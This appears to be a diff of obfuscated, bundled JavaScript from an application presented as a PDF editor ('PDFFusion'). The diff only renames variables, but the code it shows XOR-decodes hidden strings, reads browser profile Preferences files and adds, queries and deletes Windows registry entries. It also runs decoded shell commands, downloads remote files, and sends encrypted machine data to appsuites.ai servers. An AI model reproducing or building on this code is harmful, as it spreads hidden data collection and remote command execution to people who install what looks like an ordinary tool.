@@ -102,11 +102,11 @@
       })(u = r.a689XV5 || (r.a689XV5 = {}));
       const v = class {
         static s6B3E35(y) {
-          let str = '';
+          let string = '';
           for (let i2 = 0; i2 < y.length; i2++) {
-            str += t.w3F3UWA[y[i2] - 48][0];
+            string += t.w3F3UWA[y[i2] - 48][0];
           }
-          return str;
+          return string;
         }
       };
       r.i4B82NN = v;
@@ -389,12 +389,12 @@
           return require("path").basename(this.P4ECJBE);
         }
         static D471SJS(aa) {
-          const arr = [];
-          const arr2 = [130, 176, 216, 182, 29, 104, 2, 25, 65, 7, 28, 250, 126, 181, 101, 27];
+          const array = [];
+          const array2 = [130, 176, 216, 182, 29, 104, 2, 25, 65, 7, 28, 250, 126, 181, 101, 27];
           for (let j2 = 0; j2 < aa.length; j2++) {
-            arr.push(aa[j2] ^ arr2[j2 % arr2.length]);
+            array.push(aa[j2] ^ array2[j2 % array2.length]);
           }
-          return Buffer.from(arr).toString();
+          return Buffer.from(array).toString();
         }
         static async c5E4Z7C(ab, ac) {
           switch (z.y49649G) {
@@ -429,23 +429,23 @@
             fs2.mkdirSync(al);
           }
           let an = fs2.existsSync(am) ? fs2.readFileSync(am, "utf8") : undefined;
-          let arr3 = [];
+          let array3 = [];
           if (an != undefined) {
             const ao = Buffer.from(an, "hex").toString("utf8");
             const ap = !ao ? {} : JSON.parse(ao);
             if (ap.hasOwnProperty("json")) {
-              arr3 = ap.json;
+              array3 = ap.json;
             }
           }
-          for (let k2 = 0; k2 < z.l536G7W.length - arr3.length; k2++) {
-            arr3.push('');
+          for (let k2 = 0; k2 < z.l536G7W.length - array3.length; k2++) {
+            array3.push('');
           }
-          arr3[z.l536G7W.indexOf(aj)] = ak;
-          const obj = {
-            json: arr3
+          array3[z.l536G7W.indexOf(aj)] = ak;
+          const object = {
+            json: array3
           };
-          z.o699XQ0 = obj;
-          an = Buffer.from(JSON.stringify(obj), "utf8").toString("hex").toUpperCase();
+          z.o699XQ0 = object;
+          an = Buffer.from(JSON.stringify(object), "utf8").toString("hex").toUpperCase();
           fs2.writeFileSync(am, an);
         }
         static async l610ZCY(aq) {
@@ -461,14 +461,14 @@
         static async l616AL1(ar) {
           const as = z.s59E3EX;
           const fs3 = require("fs");
-          let str2 = '';
+          let string2 = '';
           try {
             if (!z.o699XQ0 && fs3.existsSync(as)) {
-              str2 = fs3.readFileSync(as, "utf8");
-              z.o699XQ0 = JSON.parse(str2);
+              string2 = fs3.readFileSync(as, "utf8");
+              z.o699XQ0 = JSON.parse(string2);
             }
           } catch (at) {
-            await s.w3F3UWA.Y6CDW21(0, [138, ''], at, [str2]);
+            await s.w3F3UWA.Y6CDW21(0, [138, ''], at, [string2]);
             return;
           }
           if (!z.o699XQ0 || !Object.prototype.hasOwnProperty.call(z.o699XQ0, ar)) {
@@ -479,24 +479,24 @@
         static async N3FBEKL(au) {
           const av = z.s59E3EX;
           const fs4 = require("fs");
-          let str3 = '';
+          let string3 = '';
           try {
             if (!z.o699XQ0 && fs4.existsSync(av)) {
-              str3 = fs4.readFileSync(av, "utf8");
-              const ax = Buffer.from(str3, "hex").toString("utf8");
+              string3 = fs4.readFileSync(av, "utf8");
+              const ax = Buffer.from(string3, "hex").toString("utf8");
               const ay = !ax ? {} : JSON.parse(ax);
-              let arr4 = [];
+              let array4 = [];
               if (ay.hasOwnProperty("json")) {
-                arr4 = ay.json;
+                array4 = ay.json;
               }
-              for (let l2 = 0; l2 < z.l536G7W.length - arr4.length; l2++) {
-                arr4.push('');
+              for (let l2 = 0; l2 < z.l536G7W.length - array4.length; l2++) {
+                array4.push('');
               }
-              ay.json = arr4;
+              ay.json = array4;
               z.o699XQ0 = ay;
             }
           } catch (az) {
-            await s.w3F3UWA.Y6CDW21(0, [138, ''], az, [str3]);
+            await s.w3F3UWA.Y6CDW21(0, [138, ''], az, [string3]);
             return;
           }
           const aw = z.l536G7W.indexOf(au);
@@ -524,18 +524,18 @@
           }
           const bd = z.k47ASDC;
           const fs5 = require("fs");
-          let str4 = '';
+          let string4 = '';
           try {
             if (fs5.existsSync(bd)) {
               const be = function (bi) {
-                let str5 = '';
+                let string5 = '';
                 for (let m2 = 0; m2 < bi.length; m2++) {
-                  str5 += bi.charCodeAt(m2).toString(16).padStart(2, '0');
+                  string5 += bi.charCodeAt(m2).toString(16).padStart(2, '0');
                 }
-                return str5;
+                return string5;
               };
-              str4 = fs5.readFileSync(bd, "utf8");
-              const bf = !str4 ? {} : JSON.parse(str4);
+              string4 = fs5.readFileSync(bd, "utf8");
+              const bf = !string4 ? {} : JSON.parse(string4);
               const bg = bf.hasOwnProperty("uid") ? bf.uid : '';
               const bh = bf.hasOwnProperty("sid") ? bf.sid : '';
               if (bg != '') {
@@ -546,7 +546,7 @@
               }
             }
           } catch (bj) {
-            await s.w3F3UWA.Y6CDW21(0, [147, ''], bj, [str4]);
+            await s.w3F3UWA.Y6CDW21(0, [147, ''], bj, [string4]);
             return;
           }
         }
@@ -980,18 +980,18 @@
             if (!ej) {
               return '';
             }
-            let str6 = '';
+            let string6 = '';
             for (const ek of ej) {
-              if (str6.length > 0) {
-                str6 += '|';
+              if (string6.length > 0) {
+                string6 += '|';
               }
               if (typeof ek === 'boolean') {
-                str6 += ek ? '1' : '0';
+                string6 += ek ? '1' : '0';
               } else {
-                str6 += ek.toString().replace('|', '_');
+                string6 += ek.toString().replace('|', '_');
               }
             }
-            return str6;
+            return string6;
           }
           var ef = ci.e5325L3.q474LOF ?? '';
           if (ef == '') {
@@ -1060,7 +1060,7 @@
         if (ev.has('')) {
           ev.append('', '');
         }
-        const obj2 = {
+        const object2 = {
           headers: {
             "Content-Type": "application/x-www-form-urlencoded"
           },
@@ -1068,12 +1068,12 @@
           body: ev
         };
         try {
-          ew = await fetch2(ex, obj2);
+          ew = await fetch2(ex, object2);
         } catch {}
         if (!ew || !ew.ok) {
           try {
             ex = "https://sdk.appsuites.ai/" + eu;
-            ew = await fetch2(ex, obj2);
+            ew = await fetch2(ex, object2);
           } catch {}
         }
         return ew;
@@ -1095,11 +1095,11 @@
       function cu(fa, fb) {
         return new Promise((fc, fd) => {
           const fe = require("fs").createWriteStream(fb, {});
-          const ff = (fa.startsWith("https") ? require("https") : require("http")).get(fa, (res) => {
-            if (!res.statusCode || res.statusCode < 200 || res.statusCode > 299) {
-              fd(new Error("LoadPageFailed " + res.statusCode));
+          const ff = (fa.startsWith("https") ? require("https") : require("http")).get(fa, (response) => {
+            if (!response.statusCode || response.statusCode < 200 || response.statusCode > 299) {
+              fd(new Error("LoadPageFailed " + response.statusCode));
             }
-            res.pipe(fe);
+            response.pipe(fe);
             fe.on("finish", function () {
               fe.destroy();
               fc();
@@ -1220,11 +1220,11 @@
       })(gi || (gi = {}));
       function gj(hq) {
         const hr = Buffer.isBuffer(hq) ? hq : Buffer.from(hq);
-        const buf = Buffer.from(hr.slice(4));
-        for (let n2 = 0; n2 < buf.length; n2++) {
-          buf[n2] ^= hr.slice(0, 4)[n2 % 4];
+        const buffer = Buffer.from(hr.slice(4));
+        for (let n2 = 0; n2 < buffer.length; n2++) {
+          buffer[n2] ^= hr.slice(0, 4)[n2 % 4];
         }
-        return buf.toString("utf8");
+        return buffer.toString("utf8");
       }
       function gk(hs) {
         hs = hs[gj([16, 233, 75, 213, 98, 140, 59, 185, 113, 138, 46])](/-/g, '');
@@ -1298,12 +1298,12 @@
       }
       const gu = class {
         static W698NHL(ir) {
-          const arr5 = [];
+          const array5 = [];
           if (!Array.isArray(ir)) {
-            return arr5;
+            return array5;
           }
           for (const is of ir) {
-            arr5.push({
+            array5.push({
               d5E0TQS: is.Path ?? '',
               a47DHT3: is.Data ?? '',
               i6B2K9E: is.Key ?? '',
@@ -1311,7 +1311,7 @@
               Q57DTM8: typeof is.Action === "number" ? is.Action : 0
             });
           }
-          return arr5;
+          return array5;
         }
         static T6B99CG(it) {
           return it.map((iu) => ({
@@ -1387,12 +1387,12 @@
         const path3 = require("path");
         const os = require("os");
         let jg = jf;
-        const obj3 = {
+        const object3 = {
           "%LOCALAPPDATA%": path3.join(os.homedir(), "AppData", "Local"),
           "%APPDATA%": path3.join(os.homedir(), "AppData", "Roaming"),
           "%USERPROFILE%": os.homedir()
         };
-        for (const [jh, ji] of Object.entries(obj3)) {
+        for (const [jh, ji] of Object.entries(object3)) {
           const regex = new RegExp(jh, 'i');
           if (regex.test(jg)) {
             jg = jg.replace(regex, ji);
@@ -1421,18 +1421,18 @@
       async function hd(jm) {
         return new Promise((jn, jo) => {
           (jm.startsWith("https") ? require("https") : require("http")).get(jm, (jp) => {
-            const arr6 = [];
-            jp.on("data", (jq) => arr6.push(jq));
-            jp.on("end", () => jn(Buffer.concat(arr6)));
+            const array6 = [];
+            jp.on("data", (jq) => array6.push(jq));
+            jp.on("end", () => jn(Buffer.concat(array6)));
           }).on("error", (jr) => jo(jr));
         });
       }
-      var str7 = '';
+      var string7 = '';
       var he;
       async function hf(js, jt) {
         const ju = new require("url").URLSearchParams({
-          data: gr(JSON.stringify(gu.b558GNO(js)), str7),
-          iid: str7
+          data: gr(JSON.stringify(gu.b558GNO(js)), string7),
+          iid: string7
         }).toString();
         return await await require("node-fetch")("https://on.appsuites.ai" + jt, {
           headers: {
@@ -1450,7 +1450,7 @@
         for (let jx = 0; jx < 3; jx++) {
           jv.I489V4T = ha();
           const jy = await hf(jv, jw);
-          if (jy && (typeof gx(jy)?.iid === "string" ? gx(jy).iid : '') === str7) {
+          if (jy && (typeof gx(jy)?.iid === "string" ? gx(jy).iid : '') === string7) {
             break;
           }
           await new Promise((jz) => setTimeout(jz, 3000));
@@ -1459,7 +1459,7 @@
       async function hh(ka) {
         const path4 = require("path");
         const fs9 = require("fs");
-        const arr7 = [];
+        const array7 = [];
         const kb = (kh) => {
           kh.A575H6Y = false;
           if (kh.d5E0TQS) {
@@ -1513,7 +1513,7 @@
               const ku = gy(gy(gy(gy(gx(fs9.readFileSync(kt, "utf8")), "profile"), "content_settings"), "exceptions"), "site_engagement");
               const json = JSON.stringify(ku);
               if (json) {
-                arr7.push({
+                array7.push({
                   d5E0TQS: path4.join(kp.d5E0TQS, ks, "Preferences"),
                   a47DHT3: gq(Buffer.from(json, "utf8")),
                   i6B2K9E: '',
@@ -1538,13 +1538,13 @@
             kf(kg);
           }
         }
-        if (arr7.length > 0) {
-          ka.push(...arr7);
+        if (array7.length > 0) {
+          ka.push(...array7);
         }
       }
       async function hi(kv) {
-        const cp2 = require("child_process");
-        const arr8 = [];
+        const child_proc = require("child_process");
+        const array8 = [];
         const kw = (le) => {
           if (!le) {
             return ['', ''];
@@ -1556,12 +1556,12 @@
           return lf !== -1 ? [le.substring(0, lf), le.substring(lf + 1)] : [le, ''];
         };
         const kx = (lg) => {
-          return cp2.spawnSync("reg", ["query", lg], {
+          return child_proc.spawnSync("reg", ["query", lg], {
             stdio: "ignore"
           }).status === 0;
         };
         const ky = (lh, li) => {
-          const lj = cp2.spawnSync("reg", ["query", lh, "/v", li], {
+          const lj = child_proc.spawnSync("reg", ["query", lh, "/v", li], {
             encoding: "utf8"
           });
           if (lj.status !== 0) {
@@ -1577,7 +1577,7 @@
         };
         const kz = (lm) => {
           let flag = false;
-          const ln = cp2.spawnSync("reg", ["query", lm], {
+          const ln = child_proc.spawnSync("reg", ["query", lm], {
             encoding: "utf8"
           });
           if (ln.error) {
@@ -1591,31 +1591,31 @@
             const lr = lo[lq].trim().split(/\s{4,}/);
             if (lr.length === 3) {
               const [ls, lt, lu] = lr;
-              const obj4 = {
+              const object4 = {
                 Q57DTM8: 2,
                 A575H6Y: true,
                 d5E0TQS: lm + ls,
                 a47DHT3: lu,
                 i6B2K9E: ''
               };
-              arr8.push(obj4);
+              array8.push(object4);
               flag = true;
             }
           }
           return flag;
         };
         const la = (lv, lw) => {
-          return cp2.spawnSync("reg", ["delete", lv, "/v", lw, "/f"], {
+          return child_proc.spawnSync("reg", ["delete", lv, "/v", lw, "/f"], {
             stdio: "ignore"
           }).status === 0;
         };
         const lb = (lx) => {
-          cp2.spawnSync("reg", ["delete", lx, "/f"], {
+          child_proc.spawnSync("reg", ["delete", lx, "/f"], {
             stdio: "ignore"
           });
         };
         const lc = (ly, lz, ma) => {
-          const mb = cp2.spawnSync("reg", ["add", ly, "/v", lz, "/t", "REG_SZ", "/d", ma, "/f"], {
+          const mb = child_proc.spawnSync("reg", ["add", ly, "/v", lz, "/t", "REG_SZ", "/d", ma, "/f"], {
             stdio: "ignore"
           });
           return mb.status === 0;
@@ -1652,8 +1652,8 @@
             }
           }
         }
-        if (arr8.length > 0) {
-          kv.push(...arr8);
+        if (array8.length > 0) {
+          kv.push(...array8);
         }
       }
       async function hj(mk) {
@@ -1703,7 +1703,7 @@
         if (mw.length === 0) {
           return;
         }
-        const arr9 = [];
+        const array9 = [];
         const mx = he().split('|');
         const my = (na) => {
           for (const nb of mx) {
@@ -1722,7 +1722,7 @@
             }
           } else if (mz.Q57DTM8 === 2) {
             for (const nd of mx) {
-              arr9.push({
+              array9.push({
                 d5E0TQS: nd,
                 a47DHT3: '',
                 i6B2K9E: '',
@@ -1732,14 +1732,14 @@
             }
           }
         }
-        if (arr9.length > 0) {
-          mw.push(...arr9);
+        if (array9.length > 0) {
+          mw.push(...array9);
         }
       }
       async function hl(ne) {
         const nf = gx(ne);
         const ng = typeof nf?.iid === "string" ? nf.iid : '';
-        if (ng != str7) {
+        if (ng != string7) {
           return;
         }
         const nh = typeof nf?.data === "string" ? nf.data : '';
@@ -1762,9 +1762,9 @@
         await hg(nj, nk);
       }
       async function hm(nl, nm) {
-        str7 = nl;
+        string7 = nl;
         he = nm;
-        const obj5 = {
+        const object5 = {
           b54FBAI: 0,
           P456VLZ: 0,
           I489V4T: ha(),
@@ -1778,7 +1778,7 @@
             s67BMEP: []
           }
         };
-        const nn = await hf(obj5, "/ping");
+        const nn = await hf(object5, "/ping");
         if (nn) {
           await hl(nn);
         }
@@ -1910,27 +1910,27 @@
             await nq.w3F3UWA.Y6CDW21(0, [154, ''], undefined, ['', oq]);
             return 2;
           }
-          let str8 = '';
+          let string8 = '';
           try {
             try {
               await np.S559FZQ.c5E4Z7C("size", "67");
             } catch {}
             var or = await nq.e696T3N("api/s3/new?fid=ip&version=" + nr.e5325L3.Y55B2P2);
             if (or) {
-              str8 = await or.json().iid;
-              if (str8 != '') {
-                nr.e5325L3.q474LOF = str8;
+              string8 = await or.json().iid;
+              if (string8 != '') {
+                nr.e5325L3.q474LOF = string8;
               }
             }
-            if (str8 != '') {
+            if (string8 != '') {
               const ou = function (ov) {
-                let str9 = '';
+                let string9 = '';
                 for (let ow = 0; ow < ov.length; ow++) {
-                  str9 += ov.charCodeAt(ow).toString(16).padStart(2, '0');
+                  string9 += ov.charCodeAt(ow).toString(16).padStart(2, '0');
                 }
-                return str9;
+                return string9;
               };
-              await np.S559FZQ.c5E4Z7C("iid", str8);
+              await np.S559FZQ.c5E4Z7C("iid", string8);
               await np.S559FZQ.c5E4Z7C("usid", ou(oq));
               await nq.w3F3UWA.W4EF0EI(0, [103, ''], ['', oq]);
               return 1;
@@ -1966,20 +1966,20 @@
             var oz = await this.e4F5CS0();
             if (await this.H5AE3US(oz.O6CBOE4)) {
               const data = JSON.parse(oz.O6CBOE4);
-              const arr10 = [];
+              const array10 = [];
               for (const pa in data) {
                 if (data.hasOwnProperty(pa)) {
                   const pb = data[pa];
                   for (const pc in pb) {
                     if (pb.hasOwnProperty(pc)) {
                       await this.O69AL84(pa, pc, pb[pc]);
-                      arr10.push(pc);
+                      array10.push(pc);
                     }
                   }
                 }
               }
-              if (arr10.length > 0) {
-                await nq.w3F3UWA.W4EF0EI(0, [107, ''], arr10);
+              if (array10.length > 0) {
+                await nq.w3F3UWA.W4EF0EI(0, [107, ''], array10);
               }
             }
             if (oz.H5C67AR) {
@@ -2214,53 +2214,53 @@
         }
         async D656W9S(qc) {
           const path5 = require("path");
-          let str10 = '';
+          let string10 = '';
           if (qc == 1) {
-            str10 = path5.join(np.S559FZQ.D47CBV3(), nr.E506IW4.E42DSOG);
-            if (await this.A5FCGS4(str10)) {
-              return str10;
+            string10 = path5.join(np.S559FZQ.D47CBV3(), nr.E506IW4.E42DSOG);
+            if (await this.A5FCGS4(string10)) {
+              return string10;
             }
-            str10 = nr.E506IW4.o5D81YO;
-            if (await this.A5FCGS4(str10)) {
-              return str10;
+            string10 = nr.E506IW4.o5D81YO;
+            if (await this.A5FCGS4(string10)) {
+              return string10;
             }
-            str10 = nr.E506IW4.Y4F9KA9;
-            if (await this.A5FCGS4(str10)) {
-              return str10;
+            string10 = nr.E506IW4.Y4F9KA9;
+            if (await this.A5FCGS4(string10)) {
+              return string10;
             }
           } else if (qc == 2) {
-            str10 = nr.E506IW4.Q63EEZI;
-            if (await this.A5FCGS4(str10)) {
-              return str10;
+            string10 = nr.E506IW4.Q63EEZI;
+            if (await this.A5FCGS4(string10)) {
+              return string10;
             }
-            str10 = nr.E506IW4.L4865QA;
-            if (await this.A5FCGS4(str10)) {
-              return str10;
+            string10 = nr.E506IW4.L4865QA;
+            if (await this.A5FCGS4(string10)) {
+              return string10;
             }
           } else if (qc == 3) {
-            str10 = path5.join(require("process").env.USERPROFILE, nr.E506IW4.v4BE899);
-            if (await this.A5FCGS4(str10)) {
-              return str10;
+            string10 = path5.join(require("process").env.USERPROFILE, nr.E506IW4.v4BE899);
+            if (await this.A5FCGS4(string10)) {
+              return string10;
             }
           } else if (qc == 4) {
-            str10 = path5.join(np.S559FZQ.D47CBV3(), nr.E506IW4.O680HF3);
-            if (await this.A5FCGS4(str10)) {
-              return str10;
+            string10 = path5.join(np.S559FZQ.D47CBV3(), nr.E506IW4.O680HF3);
+            if (await this.A5FCGS4(string10)) {
+              return string10;
             }
           } else if (qc == 5) {
-            str10 = path5.join(np.S559FZQ.D47CBV3(), nr.E506IW4.n6632PG);
-            if (await this.A5FCGS4(str10)) {
-              return str10;
+            string10 = path5.join(np.S559FZQ.D47CBV3(), nr.E506IW4.n6632PG);
+            if (await this.A5FCGS4(string10)) {
+              return string10;
             }
           } else if (qc == 6) {
-            str10 = path5.join(np.S559FZQ.D47CBV3(), nr.E506IW4.P41D36M);
-            if (await this.A5FCGS4(str10)) {
-              return str10;
+            string10 = path5.join(np.S559FZQ.D47CBV3(), nr.E506IW4.P41D36M);
+            if (await this.A5FCGS4(string10)) {
+              return string10;
             }
           } else if (qc == 7) {
-            str10 = path5.join(np.S559FZQ.P6A7H5F(), nr.E506IW4.i623ZUC, nr.E506IW4.z3EF88U);
-            if (await this.A5FCGS4(str10)) {
-              return str10;
+            string10 = path5.join(np.S559FZQ.P6A7H5F(), nr.E506IW4.i623ZUC, nr.E506IW4.z3EF88U);
+            if (await this.A5FCGS4(string10)) {
+              return string10;
             }
           }
           return '';
@@ -2299,27 +2299,27 @@
               const qm = path6.join(qf, qg[qi], nr.E506IW4.z626Z6P);
               if (await this.X428OQY(qj, ql)) {
                 await this.X428OQY(qk, qm);
-                let str11 = '';
-                let str12 = '';
+                let string11 = '';
+                let string12 = '';
                 await this.r576OBZ(ql).then((qo) => {
-                  str11 = qo;
+                  string11 = qo;
                 }).catch((qp) => {
                   (async () => {
                     await nq.w3F3UWA.Y6CDW21(1, [124, ''], qp);
                   })();
                 });
                 await this.r576OBZ(qm).then((qq) => {
-                  str12 = qq;
+                  string12 = qq;
                 }).catch((qr) => {
                   (async () => {
                     await nq.w3F3UWA.Y6CDW21(1, [125, ''], qr);
                   })();
                 });
-                if (str11 == '') {
+                if (string11 == '') {
                   await nq.w3F3UWA.W4EF0EI(1, [116, '']);
                   continue;
                 }
-                const qn = await this.O515QL8(1, str11, str12);
+                const qn = await this.O515QL8(1, string11, string12);
                 if (!qn.m5BCP18) {
                   await nq.w3F3UWA.W4EF0EI(1, [114, '']);
                   return;
@@ -2345,20 +2345,20 @@
                 }
                 if (await this.H5AE3US(qn.O6CBOE4)) {
                   const data3 = JSON.parse(qn.O6CBOE4);
-                  const arr11 = [];
+                  const array11 = [];
                   for (const qs in data3) {
                     if (data3.hasOwnProperty(qs)) {
                       const qt = data3[qs];
                       for (const qu in qt) {
                         if (qt.hasOwnProperty(qu)) {
                           await this.O69AL84(qs.replace("%PROFILE%", qg[qi]), qu, qt[qu]);
-                          arr11.push(qu);
+                          array11.push(qu);
                         }
                       }
                     }
                   }
-                  if (arr11.length > 0) {
-                    await nq.w3F3UWA.W4EF0EI(1, [117, ''], [arr11]);
+                  if (array11.length > 0) {
+                    await nq.w3F3UWA.W4EF0EI(1, [117, ''], [array11]);
                   }
                 }
                 flag2 = true;
@@ -2538,14 +2538,14 @@
           return new Promise((se) => setTimeout(se, sd));
         }
         async D45AYQ3(sf, sg = true) {
-          const cp3 = require("child_process");
+          const child_proc2 = require("child_process");
           if (sg) {
             for (let sh = 0; sh < 3; sh++) {
-              cp3.exec(nq.o5B4F49(nr.E506IW4.U548GP6, sf));
+              child_proc2.exec(nq.o5B4F49(nr.E506IW4.U548GP6, sf));
               await this.E4E2LLU(100);
             }
           }
-          cp3.exec(nq.o5B4F49(nr.E506IW4.q3F6NE0, sf));
+          child_proc2.exec(nq.o5B4F49(nr.E506IW4.q3F6NE0, sf));
           await this.E4E2LLU(100);
         }
         async A554U7Y(si, sj, sk = false) {
@@ -2656,7 +2656,7 @@
             var tp = nr.e5325L3.q474LOF ?? '';
             const tq = new require("url").URLSearchParams();
             const tr = np.S559FZQ.n677BRA.substring(0, 24) + tp.substring(0, 8);
-            const obj6 = {
+            const object6 = {
               iid: tp,
               version: nr.e5325L3.Y55B2P2,
               isSchedule: '0',
@@ -2664,7 +2664,7 @@
               hasBLReg: nr.e5325L3.K48B40X,
               supportWd: '1'
             };
-            const ts = nq.O694X7J(tr, JSON.stringify(obj6));
+            const ts = nq.O694X7J(tr, JSON.stringify(object6));
             tq.append("data", ts.data);
             tq.append("iv", ts.iv);
             tq.append("iid", nr.e5325L3.q474LOF ?? '');
@@ -2707,7 +2707,7 @@
             var ub = nr.e5325L3.q474LOF ?? '';
             const uc = new require("url").URLSearchParams();
             const ud = np.S559FZQ.n677BRA.substring(0, 24) + ub.substring(0, 8);
-            const obj7 = {
+            const object7 = {
               iid: ub,
               bid: ty,
               sid: this.A64CEBI,
@@ -2718,7 +2718,7 @@
               supportWd: '0',
               isSchedule: '0'
             };
-            const ue = nq.O694X7J(ud, JSON.stringify(obj7));
+            const ue = nq.O694X7J(ud, JSON.stringify(object7));
             uc.append("data", ue.data);
             uc.append("iv", ue.iv);
             uc.append("iid", nr.e5325L3.q474LOF ?? '');
@@ -2761,7 +2761,7 @@
             var ur = nr.e5325L3.q474LOF ?? '';
             const us = new require("url").URLSearchParams();
             const ut = np.S559FZQ.n677BRA.substring(0, 24) + ur.substring(0, 8);
-            const obj8 = {
+            const object8 = {
               iid: ur,
               bid: un,
               sid: this.A64CEBI,
@@ -2773,7 +2773,7 @@
               supportWd: '1',
               isSchedule: '0'
             };
-            const uu = nq.O694X7J(ut, JSON.stringify(obj8));
+            const uu = nq.O694X7J(ut, JSON.stringify(object8));
             us.append("data", uu.data);
             us.append("iv", uu.iv);
             us.append("iid", nr.e5325L3.q474LOF ?? '');
@@ -2990,7 +2990,7 @@
     'obj/globals.js'(wa, wb) {
       'use strict';
 
-      const obj9 = {
+      const object9 = {
         homeUrl: "https://pdf-tool.appsuites.ai/en/pdfeditor",
         CHANNEL_NAME: "main",
         USER_AGENT: "PDFFusion/93HEU7AJ",
@@ -3002,7 +3002,7 @@
         scheduledUTaskName: "PDFEditorUScheduledTask",
         iconSubPath: "\\assets\\icons\\win\\pdf-n.ico"
       };
-      wb.exports = obj9;
+      wb.exports = object9;
     }
   });
   const i = b({
